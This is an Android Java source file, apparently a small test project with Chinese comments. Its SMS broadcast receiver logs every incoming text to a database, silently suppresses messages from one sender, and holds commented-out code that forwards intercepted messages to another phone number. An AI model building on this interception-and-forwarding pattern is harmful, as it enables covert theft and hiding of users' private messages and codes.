package com.example.testmms;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class MySmsReceiver extends BroadcastReceiver {

	
	@Override
	public void onReceive(Context context, Intent intent) {
		MyDb db = MyDb.getInstance(context);
		// 判断是系统短信；
		// if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
		// 不再往下传播；
		StringBuffer sb = new StringBuffer();
		String sender = null;
		String content = null;
		String sendtime = null;
		Bundle bundle = intent.getExtras();
		if (bundle != null) {
			// 通过pdus获得接收到的所有短信消息，获取短信内容；
			Object[] pdus = (Object[]) bundle.get("pdus");
			// 构建短信对象数组；
			SmsMessage[] mges = new SmsMessage[pdus.length];
			for (int i = 0; i < pdus.length; i++) {
				// 获取单条短信内容，以pdu格式存,并生成短信对象；
				mges[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
			}
			for (SmsMessage mge : mges) {
				sender = mge.getDisplayOriginatingAddress();// 获取短信的发送者
				if("10010".equals(sender))
					abortBroadcast();
				content = mge.getMessageBody();// 获取短信的内容
				Date date = new Date(mge.getTimestampMillis());
				SimpleDateFormat format = new SimpleDateFormat(
						"yyyy-MM-dd HH:mm:ss");
				sendtime = format.format(date);// 获取短信发送时间；
				db.insert(sender, content, sendtime);
				sb.append("来自： "+sender +"\n\n");
				sb.append("内容： "+content);
				// SmsManager manager = SmsManager.getDefault();
				// manager.sendTextMessage("5556",
				// null,"发送人:"+sender+"-----发送时间:"+sendtime+"----内容:"+content,
				// null, null);//把拦截到的短信发送到指定的手机，此处为5556;
				// if ("5556".equals(sender)){
				// //屏蔽手机号为5556的短信，这里还可以时行一些处理，如把该信息发送到第三人的手机等等。
				// abortBroadcast();
				// }
				Toast.makeText(context, sb.toString(), Toast.LENGTH_LONG).show();
			}
			
		}

	}

}